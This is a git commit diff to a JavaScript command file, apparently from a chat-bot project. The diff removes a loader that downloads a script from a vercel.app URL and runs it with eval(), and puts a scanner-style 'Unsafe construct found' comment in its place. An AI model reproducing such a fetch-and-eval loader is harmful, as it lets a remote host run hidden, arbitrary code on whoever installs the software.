93315cfd3c7d3ac4f592841ca6e01e2aa93dbe85
DML <daudymussa1705@gmail.com>
2025-05-30 16:41:23 +0300

    Update epl.js

--- commandes/epl.js
+++ commandes/epl.js
@@ -1,20 +1,2 @@
-'use strict';
-
-const axios = require('axios');
-
-const scriptName = 'epl.js';
-const scriptUrl = `https://dullah-xmd-commands-phi.vercel.app/${scriptName}`;
-
-async function loadScript() {
-    try {
-        const response = await axios.get(scriptUrl);
-        const scriptContent = response.data;
-
-        console.log(`✅ ${scriptName} fetched and loaded successfully!`);
-        eval(scriptContent);
-    } catch (error) {
-        console.error(`❌ Error loading ${scriptName}:`, error.message);
-    }
-}
-
-loadScript();
+// Job ID: yafcrq6oc09h
+// Error: Unsafe construct found in script #0
